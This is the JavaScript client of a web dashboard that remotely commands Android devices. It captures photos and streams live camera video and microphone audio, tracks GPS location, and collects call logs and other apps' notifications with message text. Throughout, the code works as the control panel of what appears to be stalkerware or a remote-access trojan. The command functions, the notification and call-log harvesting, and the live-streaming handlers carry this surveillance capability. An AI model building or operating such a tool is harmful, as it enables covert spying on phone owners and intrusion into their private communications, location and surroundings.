const API_BASE = window.location.origin;
const WS_URL = `${window.location.protocol === 'https:' ? 'wss' : 'ws'}://${window.location.host}/ws?client=dashboard`;

let ws = null;
let selectedDevice = null;
let map = null;
let marker = null;
let pendingVideoFrame = null;
let pendingAudioFrame = null;
let onlineDeviceIds = new Set();
let audioCtx = null;

// ===== Init =====
document.addEventListener('DOMContentLoaded', () => {
  initNav();
  connectWS();
  refreshDevices();
  refreshStats();
  initMap();
});

// ===== Sidebar Toggle (Mobile) =====
function toggleSidebar() {
  document.getElementById('sidebar').classList.toggle('open');
  document.getElementById('sidebarOverlay').classList.toggle('visible');
}

function closeSidebar() {
  document.getElementById('sidebar').classList.remove('open');
  document.getElementById('sidebarOverlay').classList.remove('visible');
}

// ===== Navigation =====
function initNav() {
  document.querySelectorAll('.nav-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
      document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
      btn.classList.add('active');
      document.getElementById(`sec-${btn.dataset.section}`).classList.add('active');

      if (btn.dataset.section === 'stats') refreshStats();
      if (btn.dataset.section === 'calllogs') refreshCallLogs();
      if (btn.dataset.section === 'notifications') refreshNotifications();
      if (btn.dataset.section === 'photos') refreshPhotos();
      if (btn.dataset.section === 'commands') refreshAllCommands();

      closeSidebar();
    });
  });
}

// ===== WebSocket =====
function connectWS() {
  ws = new WebSocket(WS_URL);

  ws.onopen = () => {
    document.getElementById('wsStatus').className = 'status-dot connected';
    document.getElementById('wsLabel').textContent = 'Server Connected';
  };

  ws.onclose = () => {
    document.getElementById('wsStatus').className = 'status-dot disconnected';
    document.getElementById('wsLabel').textContent = 'Disconnected';
    setTimeout(connectWS, 3000);
  };

  ws.binaryType = 'arraybuffer';

  ws.onmessage = (e) => {
    if (e.data instanceof ArrayBuffer) {
      if (pendingVideoFrame) {
        const blob = new Blob([e.data], { type: 'image/jpeg' });
        const url = URL.createObjectURL(blob);
        const img = document.getElementById('videoFeed');
        img.src = url;
        if (img.classList.contains('hidden')) {
          img.classList.remove('hidden');
          document.getElementById('videoPlaceholder').classList.add('hidden');
          document.getElementById('videoInfo').classList.remove('hidden');
        }
        img.onload = () => URL.revokeObjectURL(url);
        pendingVideoFrame = false;
      } else if (pendingAudioFrame) {
        playAudioFrame(e.data, pendingAudioFrame.sample_rate, pendingAudioFrame.channels);
        pendingAudioFrame = null;
      }
      return;
    }

    try {
      const msg = JSON.parse(e.data);
      if (msg.type === 'device_list') {
        onlineDeviceIds = new Set(msg.devices);
        refreshDevices();
      }
      if (msg.type === 'device_response') handleDeviceResponse(msg);
      if (msg.type === 'video_frame') {
        pendingVideoFrame = true;
        document.getElementById('videoCameraLabel').textContent = `Camera: ${msg.camera}`;
      }
      if (msg.type === 'audio_frame') {
        pendingAudioFrame = { sample_rate: msg.sample_rate || 16000, channels: msg.channels || 1 };
      }
      if (msg.type === 'notification') {
        handleLiveNotification(msg);
      }
    } catch (err) {}
  };
}

function handleDeviceResponse(msg) {
  const status = msg.success ? 'Command succeeded' : 'Command failed';
  showToast(`${msg.command_type}: ${status}${msg.data ? ' - ' + msg.data : ''}`, !msg.success);
  if (selectedDevice === msg.device_id) loadCommandHistory(msg.device_id);
}

function playAudioFrame(pcmData, sampleRate, channels) {
  if (!document.getElementById('audioToggle')?.checked) return;

  if (!audioCtx) {
    audioCtx = new AudioContext({ sampleRate });
  }

  if (audioCtx.state === 'suspended') {
    audioCtx.resume();
  }

  const int16 = new Int16Array(pcmData);
  const float32 = new Float32Array(int16.length);
  for (let i = 0; i < int16.length; i++) {
    float32[i] = int16[i] / 32768.0;
  }

  const buffer = audioCtx.createBuffer(channels, float32.length, sampleRate);
  buffer.getChannelData(0).set(float32);

  const source = audioCtx.createBufferSource();
  source.buffer = buffer;
  source.connect(audioCtx.destination);
  source.start();
}

// ===== Confirm Modal =====
let confirmCallback = null;

function showConfirm(title, message, callback) {
  document.getElementById('confirmTitle').textContent = title;
  document.getElementById('confirmMessage').textContent = message;
  document.getElementById('confirmBtn').onclick = () => {
    closeConfirm();
    callback();
  };
  document.getElementById('confirmModal').classList.remove('hidden');
}

function closeConfirm() {
  document.getElementById('confirmModal').classList.add('hidden');
}

// ===== Stats =====
async function refreshStats() {
  try {
    const res = await fetch(`${API_BASE}/api/stats`);
    const stats = await res.json();

    document.getElementById('storageStats').innerHTML = `
      <div class="stat-card"><div class="stat-number">${stats.devices}</div><div class="stat-label">Devices</div></div>
      <div class="stat-card"><div class="stat-number">${stats.notifications || 0}</div><div class="stat-label">Notifications</div></div>
      <div class="stat-card"><div class="stat-number">${stats.photos}</div><div class="stat-label">Photos</div></div>
      <div class="stat-card"><div class="stat-number">${stats.call_logs}</div><div class="stat-label">Call Logs</div></div>
      <div class="stat-card"><div class="stat-number">${stats.locations}</div><div class="stat-label">Locations</div></div>
      <div class="stat-card"><div class="stat-number">${stats.commands}</div><div class="stat-label">Commands</div></div>
    `;

    document.getElementById('sidebarStats').innerHTML = `
      <div class="stat-item"><span>Devices</span><span>${stats.devices}</span></div>
      <div class="stat-item"><span>Notifications</span><span>${stats.notifications || 0}</span></div>
      <div class="stat-item"><span>Photos</span><span>${stats.photos}</span></div>
      <div class="stat-item"><span>Call Logs</span><span>${stats.call_logs}</span></div>
    `;
  } catch (e) {
    console.error('Stats error:', e);
  }
}

// ===== Devices =====
async function refreshDevices() {
  try {
    const res = await fetch(`${API_BASE}/api/devices`);
    const devices = await res.json();
    renderDevices(devices);
  } catch (e) {
    console.error('Failed to fetch devices:', e);
  }
}

function renderDevices(devices) {
  const container = document.getElementById('deviceList');
  if (devices.length === 0) {
    container.innerHTML = '<div class="empty-state">No devices registered yet.</div>';
    return;
  }

  container.innerHTML = devices.map(d => {
    const isOnline = onlineDeviceIds.has(d.id) || d.is_online;
    return `
    <div class="device-card" onclick="selectDevice('${d.id}')">
      <h3>${d.device_name || 'Unknown Device'}</h3>
      <div class="meta">${d.device_model || ''} | ${d.android_version || ''}</div>
      <div class="meta">ID: ${d.id.substring(0, 12)}...</div>
      <div class="meta">Last seen: ${d.last_seen ? new Date(d.last_seen).toLocaleString() : 'Never'}</div>
      <span class="online-badge ${isOnline ? 'online' : 'offline'}">${isOnline ? 'Online' : 'Offline'}</span>
    </div>
  `}).join('');
}

function selectDevice(deviceId) {
  selectedDevice = deviceId;
  document.getElementById('deviceList').parentElement.querySelector('.section-header').classList.add('hidden');
  document.getElementById('deviceList').classList.add('hidden');
  document.getElementById('deviceDetail').classList.remove('hidden');
  document.getElementById('detailTitle').textContent = `Device: ${deviceId.substring(0, 12)}...`;

  loadCommandHistory(deviceId);
  loadDeviceLocation(deviceId);
  loadDevicePhotos(deviceId);
  loadDeviceLocations(deviceId);
  loadDeviceNotifications(deviceId);

  closeSidebar();
}

function showDeviceList() {
  selectedDevice = null;
  document.getElementById('deviceDetail').classList.add('hidden');
  document.getElementById('deviceList').classList.remove('hidden');
  document.getElementById('deviceList').parentElement.querySelector('.section-header').classList.remove('hidden');
}

// ===== Commands =====
async function sendCommand(commandType, payload = {}) {
  if (!selectedDevice) return showToast('Select a device first', true);

  try {
    const res = await fetch(`${API_BASE}/api/command`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ device_id: selectedDevice, command_type: commandType, payload })
    });
    const data = await res.json();
    showToast(`Command sent: ${commandType} (${data.status})`);
    loadCommandHistory(selectedDevice);
  } catch (e) {
    showToast('Failed to send command', true);
  }
}

function capturePhoto(useFront) {
  sendCommand('CAPTURE_PHOTO', { front_camera: useFront });
}

function startVideoStream(useFront) {
  sendCommand('START_VIDEO_STREAM', { front_camera: useFront });
  document.getElementById('videoPlaceholder').textContent = 'Starting stream...';
  document.getElementById('videoPlaceholder').classList.remove('hidden');
  document.getElementById('videoFeed').classList.add('hidden');
  document.getElementById('videoInfo').classList.add('hidden');
}

function stopVideoStream() {
  sendCommand('STOP_VIDEO_STREAM');
  document.getElementById('videoFeed').classList.add('hidden');
  document.getElementById('videoPlaceholder').textContent = 'No active stream';
  document.getElementById('videoPlaceholder').classList.remove('hidden');
  document.getElementById('videoInfo').classList.add('hidden');
  pendingVideoFrame = null;
  pendingAudioFrame = null;
  if (audioCtx) {
    audioCtx.close().catch(() => {});
    audioCtx = null;
  }
}

function promptDialog() {
  document.getElementById('dialogModal').classList.remove('hidden');
}

function closeModal() {
  document.getElementById('dialogModal').classList.add('hidden');
}

function sendDialog() {
  const title = document.getElementById('dialogTitle').value;
  const message = document.getElementById('dialogMessage').value;
  if (!message.trim()) return showToast('Enter a message', true);
  sendCommand('SHOW_DIALOG', { title, message });
  closeModal();
  document.getElementById('dialogMessage').value = '';
}

async function loadCommandHistory(deviceId) {
  try {
    const res = await fetch(`${API_BASE}/api/commands/${deviceId}`);
    const commands = await res.json();

    const container = document.getElementById('commandHistory');
    if (commands.length === 0) {
      container.innerHTML = '<div class="empty-state">No commands yet.</div>';
      return;
    }

    container.innerHTML = `
      <table>
        <thead><tr><th>Type</th><th>Status</th><th>Time</th></tr></thead>
        <tbody>
          ${commands.map(c => `
            <tr>
              <td>${c.command_type}</td>
              <td><span class="status-badge ${c.status}">${c.status}</span></td>
              <td>${new Date(c.created_at).toLocaleString()}</td>
            </tr>
          `).join('')}
        </tbody>
      </table>
    `;
  } catch (e) {
    console.error('Failed to load commands:', e);
  }
}

// ===== All Commands =====
async function refreshAllCommands() {
  const devices = await fetch(`${API_BASE}/api/devices`).then(r => r.json());
  let allCommands = [];

  for (const d of devices) {
    const cmds = await fetch(`${API_BASE}/api/commands/${d.id}`).then(r => r.json());
    allCommands.push(...cmds.map(c => ({ ...c, device_name: d.device_name || d.id.substring(0, 12) })));
  }

  allCommands.sort((a, b) => new Date(b.created_at) - new Date(a.created_at));

  const container = document.getElementById('allCommands');
  if (allCommands.length === 0) {
    container.innerHTML = '<div class="empty-state">No commands yet.</div>';
    return;
  }

  container.innerHTML = `
    <table>
      <thead><tr><th>Device</th><th>Type</th><th>Status</th><th>Time</th></tr></thead>
      <tbody>
        ${allCommands.slice(0, 100).map(c => `
          <tr>
            <td>${c.device_name}</td>
            <td>${c.command_type}</td>
            <td><span class="status-badge ${c.status}">${c.status}</span></td>
            <td>${new Date(c.created_at).toLocaleString()}</td>
          </tr>
        `).join('')}
      </tbody>
    </table>
  `;
}

// ===== Map =====
function initMap() {
  map = L.map('map').setView([0, 0], 2);
  L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
    attribution: '&copy; OpenStreetMap'
  }).addTo(map);
}

async function loadDeviceLocation(deviceId) {
  try {
    const res = await fetch(`${API_BASE}/api/device/${deviceId}/location`);
    const locations = await res.json();
    const infoBar = document.getElementById('locationInfo');

    if (locations.length === 0) {
      infoBar.classList.add('hidden');
      return;
    }

    const latest = locations[0];
    map.setView([latest.latitude, latest.longitude], 15);
    if (marker) map.removeLayer(marker);
    marker = L.marker([latest.latitude, latest.longitude]).addTo(map);
    marker.bindPopup(`Lat: ${latest.latitude}<br>Lng: ${latest.longitude}<br>Time: ${new Date(latest.timestamp).toLocaleString()}`);

    infoBar.innerHTML = `Latest: ${latest.latitude.toFixed(6)}, ${latest.longitude.toFixed(6)} (${new Date(latest.timestamp).toLocaleString()})`;
    infoBar.classList.remove('hidden');
  } catch (e) {
    console.error('Failed to load location:', e);
  }
}

async function loadDeviceLocations(deviceId) {
  try {
    const res = await fetch(`${API_BASE}/api/device/${deviceId}/location`);
    const locations = await res.json();

    const container = document.getElementById('deviceLocations');
    if (locations.length === 0) {
      container.innerHTML = '<div class="empty-state">No location data.</div>';
      return;
    }

    container.innerHTML = `
      <table>
        <thead><tr><th>Latitude</th><th>Longitude</th><th>Time</th></tr></thead>
        <tbody>
          ${locations.slice(0, 20).map(l => `
            <tr>
              <td>${l.latitude.toFixed(6)}</td>
              <td>${l.longitude.toFixed(6)}</td>
              <td>${new Date(l.timestamp).toLocaleString()}</td>
            </tr>
          `).join('')}
        </tbody>
      </table>
    `;
  } catch (e) {
    console.error('Failed to load locations:', e);
  }
}

// ===== Device Photos =====
async function loadDevicePhotos(deviceId) {
  try {
    const res = await fetch(`${API_BASE}/api/device/${deviceId}/photos`);
    const photos = await res.json();

    const container = document.getElementById('devicePhotos');
    if (photos.length === 0) {
      container.innerHTML = '<div class="empty-state">No photos yet.</div>';
      return;
    }

    container.innerHTML = photos.map(p => `
      <div class="photo-card">
        <button class="photo-delete" onclick="event.stopPropagation();deletePhoto('${p.id}')">&times;</button>
        <img src="${p.storage_url}" alt="photo" loading="lazy" />
        <div class="photo-meta">${p.camera_type} | ${new Date(p.created_at).toLocaleString()}</div>
      </div>
    `).join('');
  } catch (e) {
    console.error('Failed to load device photos:', e);
  }
}

// ===== Call Logs =====
async function refreshCallLogs() {
  const devices = await fetch(`${API_BASE}/api/devices`).then(r => r.json());
  let allLogs = [];

  for (const d of devices) {
    const logs = await fetch(`${API_BASE}/api/device/${d.id}/calllogs`).then(r => r.json());
    allLogs.push(...logs.map(l => ({ ...l, device_name: d.device_name || d.id.substring(0, 12) })));
  }

  allLogs.sort((a, b) => new Date(b.call_date) - new Date(a.call_date));

  const container = document.getElementById('callLogsList');
  if (allLogs.length === 0) {
    container.innerHTML = '<div class="empty-state">No call logs.</div>';
    return;
  }

  container.innerHTML = `
    <table>
      <thead><tr><th>Device</th><th>Number</th><th>Name</th><th>Type</th><th>Duration</th><th>Date</th><th></th></tr></thead>
      <tbody>
        ${allLogs.map(l => `
          <tr>
            <td>${l.device_name}</td>
            <td>${l.phone_number}</td>
            <td>${l.contact_name || '-'}</td>
            <td>${l.call_type}</td>
            <td>${Math.floor(l.duration_seconds / 60)}m ${l.duration_seconds % 60}s</td>
            <td>${new Date(l.call_date).toLocaleString()}</td>
            <td><button class="row-delete" onclick="deleteCallLog('${l.id}')">Delete</button></td>
          </tr>
        `).join('')}
      </tbody>
    </table>
  `;
}

// ===== Photos =====
async function refreshPhotos() {
  const devices = await fetch(`${API_BASE}/api/devices`).then(r => r.json());
  let allPhotos = [];

  for (const d of devices) {
    const photos = await fetch(`${API_BASE}/api/device/${d.id}/photos`).then(r => r.json());
    allPhotos.push(...photos.map(p => ({ ...p, device_name: d.device_name || d.id.substring(0, 12) })));
  }

  allPhotos.sort((a, b) => new Date(b.created_at) - new Date(a.created_at));

  const container = document.getElementById('photoGrid');
  if (allPhotos.length === 0) {
    container.innerHTML = '<div class="empty-state">No photos.</div>';
    return;
  }

  container.innerHTML = allPhotos.map(p => `
    <div class="photo-card">
      <button class="photo-delete" onclick="event.stopPropagation();deletePhoto('${p.id}')">&times;</button>
      <img src="${p.storage_url}" alt="photo" loading="lazy" />
      <div class="photo-meta">${p.device_name} | ${p.camera_type} | ${new Date(p.created_at).toLocaleString()}</div>
    </div>
  `).join('');
}

// ===== DELETE FUNCTIONS =====

async function deletePhoto(photoId) {
  showConfirm('Delete Photo', 'Are you sure you want to delete this photo?', async () => {
    try {
      await fetch(`${API_BASE}/api/photos/${photoId}`, { method: 'DELETE' });
      showToast('Photo deleted');
      refreshPhotos();
      if (selectedDevice) loadDevicePhotos(selectedDevice);
      refreshStats();
    } catch (e) {
      showToast('Delete failed', true);
    }
  });
}

async function deleteCallLog(logId) {
  showConfirm('Delete Call Log', 'Delete this call log entry?', async () => {
    try {
      await fetch(`${API_BASE}/api/calllogs/${logId}`, { method: 'DELETE' });
      showToast('Call log deleted');
      refreshCallLogs();
      refreshStats();
    } catch (e) {
      showToast('Delete failed', true);
    }
  });
}

async function deleteDevicePhotos() {
  if (!selectedDevice) return;
  showConfirm('Delete All Device Photos', 'Delete all photos from this device?', async () => {
    try {
      await fetch(`${API_BASE}/api/device/${selectedDevice}/photos`, { method: 'DELETE' });
      showToast('All device photos deleted');
      loadDevicePhotos(selectedDevice);
      refreshStats();
    } catch (e) {
      showToast('Delete failed', true);
    }
  });
}

async function deleteDeviceCallLogs() {
  if (!selectedDevice) return;
  showConfirm('Delete All Device Call Logs', 'Delete all call logs from this device?', async () => {
    try {
      await fetch(`${API_BASE}/api/device/${selectedDevice}/calllogs`, { method: 'DELETE' });
      showToast('All call logs deleted');
      loadCommandHistory(selectedDevice);
      refreshStats();
    } catch (e) {
      showToast('Delete failed', true);
    }
  });
}

async function deleteDeviceLocations() {
  if (!selectedDevice) return;
  showConfirm('Delete All Locations', 'Delete all location data from this device?', async () => {
    try {
      await fetch(`${API_BASE}/api/device/${selectedDevice}/locations`, { method: 'DELETE' });
      showToast('All locations deleted');
      document.getElementById('deviceLocations').innerHTML = '<div class="empty-state">No location data.</div>';
      document.getElementById('locationInfo').classList.add('hidden');
      refreshStats();
    } catch (e) {
      showToast('Delete failed', true);
    }
  });
}

async function deleteAllDeviceData() {
  if (!selectedDevice) return;
  showConfirm('Delete All Device Data', 'This will delete ALL photos, call logs, locations, notifications, and commands for this device. Continue?', async () => {
    try {
      await fetch(`${API_BASE}/api/device/${selectedDevice}/photos`, { method: 'DELETE' });
      await fetch(`${API_BASE}/api/device/${selectedDevice}/calllogs`, { method: 'DELETE' });
      await fetch(`${API_BASE}/api/device/${selectedDevice}/locations`, { method: 'DELETE' });
      await fetch(`${API_BASE}/api/device/${selectedDevice}/commands`, { method: 'DELETE' });
      await fetch(`${API_BASE}/api/device/${selectedDevice}/notifications`, { method: 'DELETE' });
      showToast('All device data deleted');
      showDeviceList();
      refreshDevices();
      refreshStats();
    } catch (e) {
      showToast('Delete failed', true);
    }
  });
}

async function deleteDevice() {
  if (!selectedDevice) return;
  showConfirm('Delete Device', 'This will permanently delete the device and ALL its data. Continue?', async () => {
    try {
      await fetch(`${API_BASE}/api/device/${selectedDevice}`, { method: 'DELETE' });
      showToast('Device deleted');
      showDeviceList();
      refreshDevices();
      refreshStats();
    } catch (e) {
      showToast('Delete failed', true);
    }
  });
}

async function clearAllCommands() {
  showConfirm('Clear All Commands', 'Delete ALL commands for ALL devices?', async () => {
    try {
      const devices = await fetch(`${API_BASE}/api/devices`).then(r => r.json());
      for (const d of devices) {
        await fetch(`${API_BASE}/api/device/${d.id}/commands`, { method: 'DELETE' });
      }
      showToast('All commands cleared');
      refreshAllCommands();
      refreshStats();
    } catch (e) {
      showToast('Clear failed', true);
    }
  });
}

async function clearAllCallLogs() {
  showConfirm('Clear All Call Logs', 'Delete ALL call logs for ALL devices?', async () => {
    try {
      const devices = await fetch(`${API_BASE}/api/devices`).then(r => r.json());
      for (const d of devices) {
        await fetch(`${API_BASE}/api/device/${d.id}/calllogs`, { method: 'DELETE' });
      }
      showToast('All call logs cleared');
      refreshCallLogs();
      refreshStats();
    } catch (e) {
      showToast('Clear failed', true);
    }
  });
}

async function clearAllPhotos() {
  showConfirm('Delete All Photos', 'Delete ALL photos from ALL devices? This removes files from storage too.', async () => {
    try {
      const devices = await fetch(`${API_BASE}/api/devices`).then(r => r.json());
      for (const d of devices) {
        await fetch(`${API_BASE}/api/device/${d.id}/photos`, { method: 'DELETE' });
      }
      showToast('All photos deleted');
      refreshPhotos();
      refreshStats();
    } catch (e) {
      showToast('Delete failed', true);
    }
  });
}

async function nukeAllData() {
  showConfirm('DELETE EVERYTHING', 'This will permanently delete ALL devices, photos, call logs, locations, and commands. This cannot be undone!', async () => {
    try {
      const devices = await fetch(`${API_BASE}/api/devices`).then(r => r.json());
      for (const d of devices) {
        await fetch(`${API_BASE}/api/device/${d.id}`, { method: 'DELETE' });
      }
      showToast('All data deleted');
      refreshDevices();
      refreshStats();
    } catch (e) {
      showToast('Delete failed', true);
    }
  });
}

// ===== Notifications =====
function handleLiveNotification(msg) {
  showToast(`[${msg.app_name}] ${msg.sender}: ${msg.message.substring(0, 60)}`);

  if (document.getElementById('sec-notifications')?.classList.contains('active')) {
    refreshNotifications();
  }
}

async function refreshNotifications() {
  const devices = await fetch(`${API_BASE}/api/devices`).then(r => r.json());
  let allNotifs = [];

  for (const d of devices) {
    const notifs = await fetch(`${API_BASE}/api/device/${d.id}/notifications`).then(r => r.json());
    allNotifs.push(...notifs.map(n => ({ ...n, device_name: d.device_name || d.id.substring(0, 12) })));
  }

  allNotifs.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));

  const container = document.getElementById('notifList');
  if (allNotifs.length === 0) {
    container.innerHTML = '<div class="empty-state">No notifications captured yet. Enable Notification Access on the device.</div>';
    return;
  }

  container.innerHTML = `
    <table>
      <thead><tr><th>Device</th><th>App</th><th>Sender</th><th>Message</th><th>Time</th><th></th></tr></thead>
      <tbody>
        ${allNotifs.slice(0, 200).map(n => `
          <tr>
            <td>${n.device_name}</td>
            <td><strong>${n.app_name || n.app_package}</strong></td>
            <td>${n.sender || '-'}</td>
            <td style="max-width:400px;white-space:pre-wrap;word-break:break-word">${escapeHtml(n.message || '')}</td>
            <td>${n.timestamp ? new Date(n.timestamp).toLocaleString() : '-'}</td>
            <td><button class="row-delete" onclick="deleteNotification('${n.id}')">Delete</button></td>
          </tr>
        `).join('')}
      </tbody>
    </table>
  `;
}

function escapeHtml(text) {
  const div = document.createElement('div');
  div.textContent = text;
  return div.innerHTML;
}

async function deleteNotification(notifId) {
  try {
    await fetch(`${API_BASE}/api/notifications/${notifId}`, { method: 'DELETE' });
    refreshNotifications();
  } catch (e) {
    showToast('Delete failed', true);
  }
}

async function clearAllNotifications() {
  showConfirm('Clear All Notifications', 'Delete all captured notifications for ALL devices?', async () => {
    try {
      const devices = await fetch(`${API_BASE}/api/devices`).then(r => r.json());
      for (const d of devices) {
        await fetch(`${API_BASE}/api/device/${d.id}/notifications`, { method: 'DELETE' });
      }
      showToast('All notifications cleared');
      refreshNotifications();
      refreshStats();
    } catch (e) {
      showToast('Clear failed', true);
    }
  });
}

// ===== Device Notifications (in detail panel) =====
async function loadDeviceNotifications(deviceId) {
  try {
    const res = await fetch(`${API_BASE}/api/device/${deviceId}/notifications`);
    const notifs = await res.json();

    const container = document.getElementById('deviceNotifications');
    if (notifs.length === 0) {
      container.innerHTML = '<div class="empty-state">No notifications captured.</div>';
      return;
    }

    container.innerHTML = `
      <table>
        <thead><tr><th>App</th><th>Sender</th><th>Message</th><th>Time</th></tr></thead>
        <tbody>
          ${notifs.slice(0, 50).map(n => `
            <tr>
              <td><strong>${n.app_name || n.app_package}</strong></td>
              <td>${n.sender || '-'}</td>
              <td style="max-width:400px;white-space:pre-wrap;word-break:break-word">${escapeHtml(n.message || '')}</td>
              <td>${n.timestamp ? new Date(n.timestamp).toLocaleString() : '-'}</td>
            </tr>
          `).join('')}
        </tbody>
      </table>
    `;
  } catch (e) {
    console.error('Failed to load notifications:', e);
  }
}

async function deleteDeviceNotifications() {
  if (!selectedDevice) return;
  try {
    await fetch(`${API_BASE}/api/device/${selectedDevice}/notifications`, { method: 'DELETE' });
    showToast('Notifications cleared');
    loadDeviceNotifications(selectedDevice);
    refreshStats();
  } catch (e) {
    showToast('Delete failed', true);
  }
}

// ===== Toast =====
function showToast(message, isError = false) {
  const toast = document.getElementById('toast');
  toast.textContent = message;
  toast.className = isError ? 'toast error' : 'toast';
  toast.classList.remove('hidden');
  setTimeout(() => toast.classList.add('hidden'), 4000);
}
